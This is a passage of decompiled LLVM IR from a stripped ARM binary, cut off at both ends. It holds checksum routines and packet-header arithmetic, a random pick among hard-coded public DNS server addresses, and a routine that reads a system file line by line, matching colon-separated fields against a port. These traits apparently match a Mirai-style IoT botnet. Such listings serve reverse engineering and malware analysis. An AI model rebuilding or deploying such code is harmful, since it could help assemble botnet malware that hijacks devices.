  %v0_dba4 = load i32, i32* %ip.global-to-local, align 4
  %v6_dbac = call i32 @function_138bc(i32 %v3_d844, i32 %v0_db90, i32 %v0_db9c, i32 16384, i32 %v0_dba4, i32 16)
  %v3_dbb0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dbb0, i32* %r3.global-to-local, align 4
  %v1_dbb4 = add i32 %v3_dbb0, 1
  store i32 %v1_dbb4, i32* %r0.global-to-local, align 4
  %v0_dbb8 = load i32, i32* @r8, align 4
  %v9_dbb8 = icmp eq i32 %v0_dbb8, %v1_dbb4
  store i1 %v9_dbb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dbb4, i32* %stack_var_-44, align 4
  %v8_dbc0 = icmp sgt i32 %v0_dbb8, %v1_dbb4
  br i1 %v8_dbc0, label %dec_label_pc_dae8, label %dec_label_pc_dbc4

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_db2c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_dbc8 = icmp eq i32 %v0_dbb8, 0
  store i1 %v2_dbc8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_dbc8, label %dec_label_pc_dacc, label %dec_label_pc_dadc

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dae8
  %v0_dbd8 = call i32 @function_f700()
  %v1_dbd8 = trunc i32 %v0_dbd8 to i16
  store i32 %v0_dbd8, i32* %r0.global-to-local, align 4
  store i32 %v3_d8a8, i32* @lr, align 4
  %v1_dbe0 = load i32, i32* @r5, align 4
  %v9_dbe0 = icmp eq i32 %v3_d8a8, %v1_dbe0
  store i1 %v9_dbe0, i1* %cpsr_z.global-to-local, align 1
  %v3_dbe4 = load i32, i32* @r4, align 4
  %v4_dbe4 = add i32 %v3_dbe4, 4
  %v5_dbe4 = inttoptr i32 %v4_dbe4 to i16*
  store i16 %v1_dbd8, i16* %v5_dbe4, align 2
  br i1 %v9_dbe0, label %dec_label_pc_dbec, label %dec_label_pc_dbd8.dec_label_pc_db14_crit_edge

dec_label_pc_dbd8.dec_label_pc_db14_crit_edge:    ; preds = %dec_label_pc_dbd8
  %v1_db18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_db14

dec_label_pc_dbec:                                ; preds = %dec_label_pc_dbd8, %dec_label_pc_db08
  %v0_dbec = call i32 @function_f700()
  %v1_dbec = trunc i32 %v0_dbec to i16
  %v3_dbf0 = load i32, i32* @r4, align 4
  %v4_dbf0 = add i32 %v3_dbf0, 20
  %v5_dbf0 = inttoptr i32 %v4_dbf0 to i16*
  store i16 %v1_dbec, i16* %v5_dbf0, align 2
  store i32 %v3_d8c4, i32* %r0.global-to-local, align 4
  %v1_dbf8 = load i32, i32* @r5, align 4
  %v9_dbf8 = icmp eq i32 %v3_d8c4, %v1_dbf8
  store i1 %v9_dbf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbf8, label %dec_label_pc_dc00, label %dec_label_pc_db20

dec_label_pc_dc00:                                ; preds = %dec_label_pc_dbec, %dec_label_pc_db14
  %v0_dc00 = call i32 @function_f700()
  %v1_dc00 = trunc i32 %v0_dc00 to i16
  store i32 %v0_dc00, i32* %r0.global-to-local, align 4
  store i32 %v3_d8cc, i32* %r2.global-to-local, align 4
  %v1_dc08 = load i32, i32* @r5, align 4
  %v9_dc08 = icmp eq i32 %v3_d8cc, %v1_dc08
  store i1 %v9_dc08, i1* %cpsr_z.global-to-local, align 1
  %v3_dc0c = load i32, i32* @r6, align 4
  %v4_dc0c = add i32 %v3_dc0c, 2
  %v5_dc0c = inttoptr i32 %v4_dc0c to i16*
  store i16 %v1_dc00, i16* %v5_dc0c, align 2
  br i1 %v9_dc08, label %dec_label_pc_dc14, label %dec_label_pc_db2c

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dc00, %dec_label_pc_db20
  %v0_dc14 = call i32 @function_f700()
  %v1_dc14 = trunc i32 %v0_dc14 to i16
  store i32 %v0_dc14, i32* %r0.global-to-local, align 4
  %v3_dc18 = load i32, i32* @r4, align 4
  %v4_dc18 = add i32 %v3_dc18, 28
  %v5_dc18 = inttoptr i32 %v4_dc18 to i16*
  store i16 %v1_dc14, i16* %v5_dc18, align 2
  br label %dec_label_pc_db2c

dec_label_pc_dc20:                                ; preds = %dec_label_pc_d7ac, %dec_label_pc_d78c, %dec_label_pc_d730, %dec_label_pc_d5dc
  %v0_dc20 = call i32 @function_f700()
  %v1_dc24 = urem i32 %v0_dc20, 4
  store i32 %v1_dc24, i32* %r0.global-to-local, align 4
  %v2_dc28 = icmp eq i32 %v1_dc24, 3
  store i1 %v2_dc28, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_dc20 to i2
  switch i2 %trunc, label %dec_label_pc_d82411 [
    i2 0, label %dec_label_pc_dc5c
    i2 1, label %dec_label_pc_dc88
    i2 -2, label %dec_label_pc_dc7c
    i2 -1, label %dec_label_pc_dc6c
  ]

dec_label_pc_dc44:                                ; preds = %dec_label_pc_d854
  store i32 %v3_d844, i32* %r0.global-to-local, align 4
  %v1_dc48 = call i32 @function_1314c(i32 %v3_d844)
  store i32 %v1_dc48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_d82c, %dec_label_pc_d824, %dec_label_pc_dc44
  %v1_dc58 = phi i32 [ %v3_d844, %dec_label_pc_d82c ], [ %v1_dc5849, %dec_label_pc_d824 ], [ %v1_dc48, %dec_label_pc_dc44 ]
  store i32 %v18_d5dc, i32* %sb.global-to-local, align 4
  store i32 %v27_d5dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_dc58

dec_label_pc_dc5c:                                ; preds = %dec_label_pc_dc20
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_d824

dec_label_pc_dc6c:                                ; preds = %dec_label_pc_dc20
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_d824

dec_label_pc_dc7c:                                ; preds = %dec_label_pc_dc20
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_d824

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dc20
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_d824

; uselistorder directives
  uselistorder i32 %v1_dc24, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_dc20, { 1, 0 }
  uselistorder i32 %v0_dc14, { 1, 0 }
  uselistorder i32 %v0_dc00, { 1, 0 }
  uselistorder i32 %v1_dbf8, { 1, 0 }
  uselistorder i32 %v0_dbd8, { 1, 0 }
  uselistorder i32 %v1_dbb4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_db7c, { 1, 0 }
  uselistorder i32 %v4_db68, { 1, 0 }
  uselistorder i32 %v2_db48, { 1, 0 }
  uselistorder i1 %v3_db0c, { 1, 0 }
  uselistorder i1 %v3_dafc, { 1, 0 }
  uselistorder i32 %v4_db30.pre-phi, { 1, 0 }
  uselistorder i32 %v1_daa4, { 1, 0, 2 }
  uselistorder i32 %v0_da94, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_da80, { 2, 0, 3, 1 }
  uselistorder i32 %v0_da7c, { 1, 0, 2 }
  uselistorder i32 %v0_d9ec, { 1, 0 }
  uselistorder i32 %v4_d9e8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 0 }
  uselistorder i32 %v3_d8f0, { 1, 0 }
  uselistorder i32 %v1_d8e4, { 2, 0, 1 }
  uselistorder i32 %v3_d8b0, { 1, 0 }
  uselistorder i32 %v3_d8a8, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_d8a0, { 0, 2, 1 }
  uselistorder i8 %v5_d898, { 1, 0, 2 }
  uselistorder i32 %v1_d884, { 1, 0 }
  uselistorder i32 %v0_d884, { 1, 0 }
  uselistorder i1 %v7_d874, { 1, 0 }
  uselistorder i1 %v7_d848, { 1, 0 }
  uselistorder i32 %v3_d844, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_d824, { 1, 0, 2 }
  uselistorder i32 %v2_d7f4, { 0, 1, 3, 2 }
  uselistorder i32 %v2_d7f0, { 1, 0, 2 }
  uselistorder i1 %v7_d7e0, { 1, 0 }
  uselistorder i32 %v1_d7dc, { 1, 0, 2 }
  uselistorder i1 %v8_d7d4, { 1, 0 }
  uselistorder i1 %v7_d7d0, { 1, 0 }
  uselistorder i32 %v1_d7c4, { 1, 0 }
  uselistorder i8 %v2_d7b8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d7bc, { 1, 0 }
  uselistorder i32 %v0_d7dc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d7ac, { 0, 2, 1 }
  uselistorder i32 %v1_d7c0, { 0, 2, 1 }
  uselistorder i32 %v2_d794, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d78c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d784, { 1, 0 }
  uselistorder i32 %v0_d784, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_d728, { 1, 0, 3, 2 }
  uselistorder i32 %v6_d6c8, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d6ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d694, { 2, 1, 0 }
  uselistorder i32 %v1_d67c, { 1, 0 }
  uselistorder i32 %v7_d638, { 1, 0, 2 }
  uselistorder i32 %v2_d5fc, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 35, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 41, 4, 42, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 35, 34, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 (i32)* @function_13690, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_a45c, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 90, 91 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dc4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dadc, { 1, 0 }
  uselistorder label %dec_label_pc_dacc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dacc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_da9c, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_d7ec, { 1, 0 }
  uselistorder label %dec_label_pc_d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_d7ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d7a4, { 1, 0 }
}

define i32 @function_dc98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dc98:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_dcbc, label %dec_label_pc_dca4

dec_label_pc_dca4:                                ; preds = %dec_label_pc_dc98
  %v0_dcac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dca8

dec_label_pc_dca8:                                ; preds = %dec_label_pc_dca8, %dec_label_pc_dca4
  %v0_dcb4 = phi i32 [ %v2_dcb4, %dec_label_pc_dca8 ], [ 0, %dec_label_pc_dca4 ]
  %v0_dcac = phi i32 [ %v5_dcac, %dec_label_pc_dca8 ], [ %v0_dcac.pre, %dec_label_pc_dca4 ]
  %v0_dca8 = phi i32 [ %v1_dca8, %dec_label_pc_dca8 ], [ %arg1, %dec_label_pc_dca4 ]
  %v1_dca8 = add i32 %v0_dca8, -2
  %v1_dcac = inttoptr i32 %v0_dcac to i16*
  %v2_dcac = load i16, i16* %v1_dcac, align 2
  %v3_dcac = zext i16 %v2_dcac to i32
  %v5_dcac = add i32 %v0_dcac, -2
  store i32 %v5_dcac, i32* @r0, align 4
  %v2_dcb4 = add i32 %v3_dcac, %v0_dcb4
  %v1_dca8.cmp = icmp ugt i32 %v1_dca8, 1
  br i1 %v1_dca8.cmp, label %dec_label_pc_dca8, label %dec_label_pc_dcbc.loopexit

dec_label_pc_dcbc.loopexit:                       ; preds = %dec_label_pc_dca8
  br label %dec_label_pc_dcbc

dec_label_pc_dcbc:                                ; preds = %dec_label_pc_dc98, %dec_label_pc_dcbc.loopexit
  %v1_dcc4 = phi i32 [ %v2_dcb4, %dec_label_pc_dcbc.loopexit ], [ 0, %dec_label_pc_dc98 ]
  %v0_dcbc = phi i32 [ %v1_dca8, %dec_label_pc_dcbc.loopexit ], [ %arg1, %dec_label_pc_dc98 ]
  %v7_dcbc = icmp eq i32 %v0_dcbc, 1
  br i1 %v7_dcbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dcbc
  %v1_dcc0 = load i32, i32* @r0, align 4
  %v2_dcc0 = inttoptr i32 %v1_dcc0 to i8*
  %v3_dcc0 = load i8, i8* %v2_dcc0, align 1
  %v4_dcc0 = zext i8 %v3_dcc0 to i32
  %v3_dcc4 = add i32 %v1_dcc4, %v4_dcc0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dcbc, %bb
  %v0_dcc8 = phi i32 [ %v1_dcc4, %dec_label_pc_dcbc ], [ %v3_dcc4, %bb ]
  %v3_dccc = urem i32 %v0_dcc8, 65536
  %v4_dcd0 = udiv i32 %v0_dcc8, 65536
  %v5_dcd0 = add nuw nsw i32 %v4_dcd0, %v3_dccc
  %v4_dcd4 = udiv i32 %v5_dcd0, 65536
  %v5_dcd4 = add nuw nsw i32 %v4_dcd4, %v5_dcd0
  %v1_dcd8 = urem i32 %v5_dcd4, 65536
  %v3_dce0 = xor i32 %v1_dcd8, 65535
  ret i32 %v3_dce0

; uselistorder directives
  uselistorder i32 %v5_dcd0, { 1, 0 }
  uselistorder i32 %v5_dcac, { 1, 0 }
  uselistorder i32 %v1_dca8, { 1, 0, 2 }
  uselistorder i32 %v0_dcac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_dcbc, { 1, 0 }
}

define i32 @function_dce8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dce8:
  %v1_dcf8 = add i32 %arg1, 12
  %v2_dcf8 = inttoptr i32 %v1_dcf8 to i32*
  %v3_dcf8 = load i32, i32* %v2_dcf8, align 4
  %v1_dcfc = add i32 %arg1, 16
  %v2_dcfc = inttoptr i32 %v1_dcfc to i32*
  %v3_dcfc = load i32, i32* %v2_dcfc, align 4
  %v7_dd00 = icmp sgt i32 %arg3, 1
  br i1 %v7_dd00, label %dec_label_pc_dd0c.preheader, label %dec_label_pc_dd20

dec_label_pc_dd0c.preheader:                      ; preds = %dec_label_pc_dce8
  %v0_dd10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dd0c.preheader, %dec_label_pc_dd0c
  %v0_dd18 = phi i32 [ 0, %dec_label_pc_dd0c.preheader ], [ %v2_dd18, %dec_label_pc_dd0c ]
  %v0_dd10 = phi i32 [ %v0_dd10.pre, %dec_label_pc_dd0c.preheader ], [ %v5_dd10, %dec_label_pc_dd0c ]
  %v0_dd0c = phi i32 [ %arg3, %dec_label_pc_dd0c.preheader ], [ %v1_dd0c, %dec_label_pc_dd0c ]
  %v1_dd0c = add nsw i32 %v0_dd0c, -2
  %v1_dd10 = inttoptr i32 %v0_dd10 to i16*
  %v2_dd10 = load i16, i16* %v1_dd10, align 2
  %v3_dd10 = zext i16 %v2_dd10 to i32
  %v5_dd10 = add i32 %v0_dd10, -2
  store i32 %v5_dd10, i32* @r1, align 4
  %v2_dd18 = add i32 %v3_dd10, %v0_dd18
  %v8_dd1c = icmp sgt i32 %v1_dd0c, 1
  br i1 %v8_dd1c, label %dec_label_pc_dd0c, label %dec_label_pc_dd20.loopexit

dec_label_pc_dd20.loopexit:                       ; preds = %dec_label_pc_dd0c
  br label %dec_label_pc_dd20

dec_label_pc_dd20:                                ; preds = %dec_label_pc_dd20.loopexit, %dec_label_pc_dce8
  %v1_dd2c = phi i32 [ %v2_dd18, %dec_label_pc_dd20.loopexit ], [ 0, %dec_label_pc_dce8 ]
  %v0_dd20 = phi i32 [ %v1_dd0c, %dec_label_pc_dd20.loopexit ], [ %arg3, %dec_label_pc_dce8 ]
  %v7_dd20 = icmp eq i32 %v0_dd20, 1
  br i1 %v7_dd20, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_dd20
  br label %bb19

bb:                                               ; preds = %dec_label_pc_dd20
  %v1_dd24 = load i32, i32* @r1, align 4
  %v2_dd24 = inttoptr i32 %v1_dd24 to i8*
  %v3_dd24 = load i8, i8* %v2_dd24, align 1
  %v4_dd24 = zext i8 %v3_dd24 to i32
  %v3_dd2c = add i32 %v4_dd24, %v1_dd2c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_dd54 = phi i32 [ %v1_dd2c, %.thread ], [ %v3_dd2c, %bb ]
  %v0_dd34 = mul i32 %v3_dcf8, 65536
  %v3_dd34 = udiv i32 %v0_dd34, 65536
  %v3_dd38 = urem i32 %v3_dcfc, 65536
  %v4_dd40 = udiv i32 %v3_dcf8, 65536
  %v2_dd3c = add nuw nsw i32 %v3_dd38, %v4_dd40
  %v5_dd40 = add nuw nsw i32 %v2_dd3c, %v3_dd34
  %v1_dd44 = add i32 %arg1, 9
  %v2_dd44 = inttoptr i32 %v1_dd44 to i8*
  %v3_dd44 = load i8, i8* %v2_dd44, align 1
  %v4_dd44 = zext i8 %v3_dd44 to i32
  %v4_dd48 = udiv i32 %v3_dcfc, 65536
  %v3_dd50 = mul nuw nsw i32 %v4_dd44, 256
  %v5_dd48 = add i32 %v4_dd48, %arg2
  %v2_dd4c = add i32 %v5_dd48, %v1_dd54
  %v2_dd54 = add i32 %v2_dd4c, %v5_dd40
  %v2_dd58 = add i32 %v2_dd54, %v3_dd50
  %tmp = icmp ult i32 %v2_dd58, 65536
  br i1 %tmp, label %dec_label_pc_dd78, label %dec_label_pc_dd64

dec_label_pc_dd64:                                ; preds = %bb19, %dec_label_pc_dd64
  %v2_dd6c5 = phi i32 [ %v2_dd6c, %dec_label_pc_dd64 ], [ %v2_dd58, %bb19 ]
  %v3_dd706.in = phi i32 [ %v2_dd6c, %dec_label_pc_dd64 ], [ %v2_dd58, %bb19 ]
  %v3_dd706 = udiv i32 %v3_dd706.in, 65536
  %v3_dd68 = urem i32 %v2_dd6c5, 65536
  %v2_dd6c = add nuw nsw i32 %v3_dd68, %v3_dd706
  %tmp20 = icmp ult i32 %v2_dd6c, 65536
  br i1 %tmp20, label %dec_label_pc_dd78.loopexit, label %dec_label_pc_dd64

dec_label_pc_dd78.loopexit:                       ; preds = %dec_label_pc_dd64
  br label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd78.loopexit, %bb19
  %v0_dd78 = phi i32 [ %v2_dd6c, %dec_label_pc_dd78.loopexit ], [ %v2_dd58, %bb19 ]
  %v1_dd78 = urem i32 %v0_dd78, 65536
  %v3_dd80 = xor i32 %v1_dd78, 65535
  ret i32 %v3_dd80

; uselistorder directives
  uselistorder i32 %v2_dd6c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_dd58, { 3, 0, 2, 1 }
  uselistorder i32 %v1_dd2c, { 1, 0 }
  uselistorder i32 %v5_dd10, { 1, 0 }
  uselistorder i32 %v0_dd10, { 1, 0 }
  uselistorder i32 %v3_dcf8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_dd64, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0 }
}

define i32 @function_dd8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_dd8c:
  %v2_dd98 = load i32, i32* @global_var_2339c.99, align 4
  %v2_dda0 = call i32 @function_12f18(i32 %v2_dd98, i32 9)
  ret i32 %v2_dda0
}

define i32 @function_ddb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_ddb4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_ddb4 = load i32, i32* @r4, align 4
  %v6_ddb4 = load i32, i32* @r5, align 4
  %v9_ddb4 = load i32, i32* @r6, align 4
  %v12_ddb4 = load i32, i32* @r7, align 4
  %v15_ddb4 = load i32, i32* @r8, align 4
  %v18_ddb4 = load i32, i32* @sb, align 4
  %v21_ddb4 = load i32, i32* @sl, align 4
  %v24_ddb4 = load i32, i32* @fp, align 4
  %v27_ddb4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_ddd0 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_ddd0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_ddfc = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_ddfc, i32* @fp, align 4
  %v3_de08 = call i32 @function_135d0(i8* nonnull %stack_var_-585, i32 0)
  %v2_de0c = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_de0c, i32* @sl, align 4
  %v0_de10 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_de1c = bitcast i32* %stack_var_-8777 to i8*
  %v3_de1c = call i32 @function_135d0(i8* %v2_de1c, i32 %v0_de10)
  %v0_de24 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_de30 = bitcast i32* %stack_var_-4681 to i8*
  %v3_de30 = call i32 @function_135d0(i8* %v2_de30, i32 %v0_de24)
  %v2_de34 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_de34, i32* @sb, align 4
  %v0_de38 = load i32, i32* %r4.global-to-local, align 4
  %v3_de38 = udiv i32 %v0_de38, 256
  %v1_de3c = urem i32 %v0_de38, 256
  store i32 %v1_de3c, i32* @r4, align 4
  %v3_de4c = trunc i32 %v3_de38 to i8
  %v4_de4c = call i32 @function_12974(i8 %v3_de4c, i32 16, i32 %v2_de34)
  %v2_de54 = call i32 @function_12480(i8* nonnull %stack_var_-72)
  %v7_de58 = icmp eq i32 %v2_de54, 2
  br i1 %v7_de58, label %dec_label_pc_e2ec, label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_ddb4, %dec_label_pc_e2ec
  %v1_de64 = call i32 @function_11be8(i32 6)
  %v1_de6c = call i32 @function_11be8(i32 7)
  %v1_de74 = call i32 @function_11be8(i32 9)
  %v0_de7c = load i32, i32* @r5, align 4
  %v3_de80 = call i32 @function_12d24(i32 ptrtoint ([14 x i8]* @global_var_18550.101 to i32), i32 %v0_de7c)
  %v7_de84 = icmp eq i32 %v3_de80, -1
  store i32 %v3_de80, i32* @r8, align 4
  br i1 %v7_de84, label %bb, label %dec_label_pc_de94.preheader

bb:                                               ; preds = %dec_label_pc_de60
  %v1_de8c = load i32, i32* @r5, align 4
  store i32 %v1_de8c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e2ac

dec_label_pc_de94.preheader:                      ; preds = %dec_label_pc_de60
  %v4_dea057 = call i32 @function_126e0(i8* nonnull %stack_var_-585, i32 512, i32 %v3_de80)
  %v2_dea459 = icmp eq i32 %v4_dea057, 0
  br i1 %v2_dea459, label %dec_label_pc_e02c.loopexit, label %dec_label_pc_deac.lr.ph

dec_label_pc_deac.lr.ph:                          ; preds = %dec_label_pc_de94.preheader
  %v2_def4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_deac

dec_label_pc_deac:                                ; preds = %dec_label_pc_deac.lr.ph, %dec_label_pc_de94.backedge
  %v3_deb0 = load i8, i8* %stack_var_-585, align 1
  %v4_deb0 = sext i8 %v3_deb0 to i32
  %v2_deb4 = icmp eq i8 %v3_deb0, 0
  br i1 %v2_deb4, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_deac
  %v8_deb8 = icmp eq i8 %v3_deb0, 58
  br i1 %v8_deb8, label %.thread8, label %dec_label_pc_decc

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_dee4

bb134:                                            ; preds = %dec_label_pc_deac
  br label %dec_label_pc_dee4

dec_label_pc_decc:                                ; preds = %bb133
  %v1_ded4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ded0

dec_label_pc_ded0:                                ; preds = %bb135, %dec_label_pc_decc
  %v0_ded0 = phi i32 [ %v1_ded0, %bb135 ], [ 0, %dec_label_pc_decc ]
  %v1_ded0 = add i32 %v0_ded0, 1
  %v2_ded4 = add i32 %v1_ded0, %v1_ded4.pre
  %v3_ded4 = inttoptr i32 %v2_ded4 to i8*
  %v4_ded4 = load i8, i8* %v3_ded4, align 1
  %v6_ded4 = zext i8 %v4_ded4 to i32
  %v2_ded8 = icmp eq i8 %v4_ded4, 0
  br i1 %v2_ded8, label %dec_label_pc_dee4, label %bb135

bb135:                                            ; preds = %dec_label_pc_ded0
  %v8_dedc = icmp eq i8 %v4_ded4, 58
  br i1 %v8_dedc, label %dec_label_pc_dee4, label %dec_label_pc_ded0

dec_label_pc_dee4:                                ; preds = %dec_label_pc_ded0, %bb135, %bb134, %.thread8
  %v1_df10 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_ded0, %bb135 ], [ %v1_ded0, %dec_label_pc_ded0 ]
  %v0_dee4 = phi i32 [ %v4_deb0, %.thread8 ], [ %v4_deb0, %bb134 ], [ %v6_ded4, %bb135 ], [ %v6_ded4, %dec_label_pc_ded0 ]
  %v2_dee4 = icmp eq i32 %v0_dee4, 0
  br i1 %v2_dee4, label %dec_label_pc_de94.backedge, label %dec_label_pc_deec

dec_label_pc_de94.backedge:                       ; preds = %dec_label_pc_dee4, %dec_label_pc_dfb4, %dec_label_pc_e000, %dec_label_pc_df30
  %v0_de9c = load i32, i32* @r8, align 4
  %v4_dea0 = call i32 @function_126e0(i8* nonnull %stack_var_-585, i32 512, i32 %v0_de9c)
  %v2_dea4 = icmp eq i32 %v4_dea0, 0
  br i1 %v2_dea4, label %dec_label_pc_e02c.loopexit, label %dec_label_pc_deac

dec_label_pc_deec:                                ; preds = %dec_label_pc_dee4
  %v1_def0 = add i32 %v1_df10, 2
  %v2_def8 = add i32 %v1_def0, %v2_def4
  %v1_defc = add i32 %v2_def8, -545
  %v2_defc = inttoptr i32 %v1_defc to i8*
  %v3_defc = load i8, i8* %v2_defc, align 1
  %v2_df00 = icmp eq i8 %v3_defc, 0
  br i1 %v2_df00, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_deec
  %v8_df04 = icmp eq i8 %v3_defc, 32
  br i1 %v8_df04, label %.thread13, label %dec_label_pc_df10

.thread13:                                        ; preds = %bb136
  store i32 %v1_def0, i32* @r5, align 4
  br label %dec_label_pc_df30

bb137:                                            ; preds = %dec_label_pc_deec
  store i32 %v1_def0, i32* @r5, align 4
  br label %dec_label_pc_df30

dec_label_pc_df10:                                ; preds = %bb136
  %v0_df10 = load i32, i32* @r6, align 4
  %v2_df10 = add i32 %v0_df10, %v1_df10
  br label %dec_label_pc_df18

